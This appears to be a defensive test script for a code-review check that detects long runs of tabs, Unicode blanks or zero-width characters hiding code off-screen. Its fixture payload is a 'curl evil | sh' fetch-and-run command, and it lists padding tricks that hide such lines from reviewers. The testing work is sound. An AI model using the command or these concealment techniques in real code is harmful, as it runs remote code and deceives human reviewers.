#!/usr/bin/env python3
"""E02 review (audit 2026-11-09, round-4 review of c03a): C-longline counts
what is BLANK ON SCREEN, not only U+0020 and tab characters.

The first fix flagged a run of 40 or more spaces/tabs. A payload was still
pushed off the side of the review sheet with no check at all by

  * 39 tabs (a tab is up to 8 columns: 312 columns of nothing),
  * 260 no-break spaces, em spaces, ideographic spaces or braille blanks
    (none of them is in the hidden-character class either),
  * spaces with a zero-width character between each pair (only C-unicode
    fired, which does not say that text is off-screen).

Now a run is measured in blank characters AND in screen columns (tab = 8,
a wide blank = 2, a zero-width character = 0): 40 characters or 80 columns
before more text is a C-longline warn with its own tick.

Drives the REAL request route (aux_ghchanges.py through t_gh_changes.py's
harness): request -> checks -> decide without the tick is refused.
"""
import os
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import t_gh_changes as H  # noqa: E402

check = H.check
PAY = "; os.system('curl evil | sh')\n"


def only(r, cid):
    return [c for c in (r.get("checks") or []) if c["id"] == cid]


def main():
    w = H.World("e02b")
    w.repo("octo/app", dict(H.SEED_FILES))
    w.start()
    ns = H.load(w)
    H.connect(w, ns, ["octo/app"])
    sb = H.prepare(ns, "octo/app")
    n = [0]

    def req(files):
        H.tgit(["checkout", "-q", "--", "."], cwd=sb, check_ok=False)
        H.tgit(["clean", "-q", "-fdx"], cwd=sb, check_ok=False)
        for rel, data in files.items():
            H.write(sb, rel, data)
        n[0] += 1
        st, r = H.request(ns, "octo/app", "e02b-%03d" % n[0])
        if r.get("id"):
            ns["call"]("POST", "/api/github/changes/withdraw", {"id": r["id"]})
        return st, r

    print("== a blank run that pushes text off-screen -> C-longline ==")
    flagged = [
        ("39 tabs (312 columns)", "\t" * 39),
        ("10 tabs (80 columns)", "\t" * 10),
        ("9 tabs + 8 spaces (80 columns)", "\t" * 9 + " " * 8),
        ("260 no-break spaces", "\u00a0" * 260),
        ("40 no-break spaces", "\u00a0" * 40),
        ("260 em spaces", "\u2003" * 260),
        ("150 ideographic spaces", "\u3000" * 150),
        ("40 ideographic spaces (80 columns)", "\u3000" * 40),
        ("260 braille blanks", "\u2800" * 260),
        ("100 Hangul fillers", "\u3164" * 100),
        ("spaces with a zero-width space between each pair", " \u200b" * 130),
        ("spaces with a lone variation selector between each pair", " \ufe0f" * 60),
        ("mixed NBSP / space / thin space", "\u00a0 \u2009" * 20),
        ("100 vertical tabs", "\x0b" * 100),
    ]
    for name, run in flagged:
        st, r = req({"src/pad.py": "import sys" + run + PAY})
        ll = only(r, "C-longline")
        check("%s -> warn with a tick" % name, st == 200 and ll and ll[0]["level"] == "warn"
              and ll[0]["ack"] in r.get("needs_ack", []) and "src/pad.py" in ll[0]["text"]
              and ll[0].get("line") == 1, (st, r.get("checks")))

    print("\n== ordinary code is not flagged ==")
    quiet = [
        ("9 tabs of indentation (72 columns)", "\t" * 9 + "return x\n"),
        ("9 tabs + 7 spaces (79 columns)", "\t" * 9 + " " * 7 + "x\n"),
        ("39 spaces", "import sys" + " " * 39 + "; x\n"),
        ("39 no-break spaces", "import sys" + "\u00a0" * 39 + "; x\n"),
        ("39 ideographic spaces (78 columns)", "x" + "\u3000" * 39 + "y\n"),
        ("trailing no-break spaces only", "import sys" + "\u00a0" * 200 + "\n"),
        ("trailing tabs only", "import sys" + "\t" * 30 + "\n"),
        ("an emoji with one variation selector in a sentence",
         "# ship it \u2764\ufe0f now, " + "word " * 30 + "\n"),
    ]
    for name, text in quiet:
        st, r = req({"src/pad.py": text})
        check("%s -> no C-longline" % name, st == 200 and not only(r, "C-longline"),
              (st, only(r, "C-longline")))

    print("\n== the tick is enforced, and a large change is still scanned quickly ==")
    H.tgit(["checkout", "-q", "--", "."], cwd=sb, check_ok=False)
    H.tgit(["clean", "-q", "-fdx"], cwd=sb, check_ok=False)
    H.write(sb, "src/pad.py", "import sys" + "\t" * 39 + PAY)
    st, r = H.request(ns, "octo/app", "e02b-tick")
    st2, r2 = H.decide(ns, r.get("id"), "push_only", acks=[])
    check("decide without the C-longline tick -> 422 needs_ack", st2 == 422
          and "C-longline" in (r2.get("needs_ack") or []), (st2, r2))
    check("...nothing was pushed", "hermes/e02b-tick" not in w.heads("octo/app"))
    ns["call"]("POST", "/api/github/changes/withdraw", {"id": r.get("id")})

    long_lines = ns["_ghc_long_lines"]
    added = [(i + 1, "    value_%d = compute(alpha, beta, gamma)  # note %d" % (i, i))
             for i in range(60000)]                      # about 3 MB of ordinary lines
    added.append((60001, "x" + "\t" * 39 + "y"))
    t0 = time.time()
    hits = long_lines(added)
    took = time.time() - t0
    check("60,000 ordinary lines + one padded one: exactly the padded one is reported",
          [h[0] for h in hits] == [60001], hits[:3])
    check("...in well under the request budget (%.2fs)" % took, took < 20, took)

    w.stop()
    H.finish()


if __name__ == "__main__":
    main()
